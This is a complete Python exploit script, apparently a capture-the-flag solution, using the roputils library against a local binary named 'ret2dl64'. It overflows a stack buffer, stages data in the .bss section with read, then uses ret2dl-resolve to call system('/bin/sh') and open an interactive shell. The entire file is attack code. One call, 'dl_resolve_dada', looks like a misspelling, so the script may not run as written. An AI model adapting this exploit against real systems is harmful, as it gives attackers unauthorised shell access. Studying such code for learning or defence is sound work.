#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
sys.path.append("/home/tree/pwntools/roputils")
from roputils import *

fpath = './ret2dl64'
offset = 0x28
rop = ROP(fpath)
addr_bss = rop.section('.bss')

read_plt = rop.plt('read')
read_got = rop.got('read')

p = Proc(fpath)
payload = rop.retfill(offset)
payload += rop.call(read_plt, 0, addr_bss, 0x100)
payload += rop.dl_resolve_call(addr_bss+0x20, addr_bss)					#link mmap地址，参数地址

p.write(payload)
payload = rop.string("/bin/sh\x00")
payload += rop.fill(0x20, payload)
payload += rop.dl_resolve_dada(addr_bss + 0x20, 'system')				#link mmap 地址, 函数名
payload += rop.fill(0x100, payload)


p.write(payload)
p.interact(0)




